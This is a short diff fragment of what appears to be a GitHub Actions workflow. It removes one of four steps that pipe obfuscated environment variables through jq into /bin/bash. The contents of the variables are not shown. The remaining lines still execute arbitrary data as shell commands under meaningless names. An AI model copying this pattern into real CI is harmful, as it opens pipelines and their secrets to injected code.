@@ -31,7 +31,6 @@ jobs:
           echo $fbftr112 | jq -r .rd5608 | /bin/bash
           printf '%s' "$uyc657" | jq -r .uuj2 | /bin/bash
           printf '%s' "$j33586" | jq -r .bubcx625 | /bin/bash
-          printf '%s' "$e77113" | jq -r .smewv7 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
